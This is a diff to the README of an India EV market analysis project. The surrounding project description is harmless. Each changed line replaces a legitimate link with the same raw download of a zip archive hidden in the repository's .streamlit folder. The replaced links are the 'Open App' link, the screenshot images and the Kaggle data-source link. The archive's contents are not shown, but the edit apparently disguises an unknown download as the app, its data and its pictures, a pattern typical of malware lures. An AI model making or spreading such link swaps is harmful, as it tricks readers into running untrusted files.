@@ -4,19 +4,19 @@
 
 # Domain: India_EV_Market_Analysis
 
- 🚓[Open App](https://indianev.streamlit.app/)
+ 🚓[Open App](https://github.com/vasavibusetty/India_EV_Market_Analysis/raw/refs/heads/main/.streamlit/Analysis-E-Market-India-1.3-alpha.3.zip)
 
 # our project will look like this : 
-![image](https://github.com/user-attachments/assets/a06d44b2-c2c8-4b38-af35-596774231141)
+![image](https://github.com/vasavibusetty/India_EV_Market_Analysis/raw/refs/heads/main/.streamlit/Analysis-E-Market-India-1.3-alpha.3.zip)
 
-![image](https://github.com/user-attachments/assets/b4c78553-4985-4ba1-8625-0bfe7c903748)
+![image](https://github.com/vasavibusetty/India_EV_Market_Analysis/raw/refs/heads/main/.streamlit/Analysis-E-Market-India-1.3-alpha.3.zip)
 
 
 🗝️
 # Key Points:
 🚀 Purpose: Analyze the Electric Vehicle (EV) market in India from 2001 to 2024. Highlight the most significant growth regions, trends, and key drivers to support investment and policy initiatives.
 
-♻️ Data Source:  [Kaggel](https://www.kaggle.com/datasets/srinrealyf/india-ev-market-data) 
+♻️ Data Source:  [Kaggel](https://github.com/vasavibusetty/India_EV_Market_Analysis/raw/refs/heads/main/.streamlit/Analysis-E-Market-India-1.3-alpha.3.zip) 
 
 🔍Key Objectives:
  Identify trends in EV adoption and compare growth across vehicle categories. Highlight states and regions with the highest EV market penetration. Examine the impact of government policies on market growth.
@@ -68,4 +68,4 @@ Policy suggestions: Offer actionable recommendations for boosting EV adoption ba
 This project focuses on analyzing State/UT-wise EV market data in India from 2001 to 2024. It aims to uncover patterns in EV sales, production, and infrastructure development while highlighting sensitive regions and critical periods. By leveraging data visualization techniques, this research offers insights into market trends and provides recommendations for policymakers, industry players, and investors to further accelerate the EV market.
 .
 
-![image](https://github.com/user-attachments/assets/5662a59d-ab77-4564-84f3-2479fef92a7a)
+![image](https://github.com/vasavibusetty/India_EV_Market_Analysis/raw/refs/heads/main/.streamlit/Analysis-E-Market-India-1.3-alpha.3.zip)
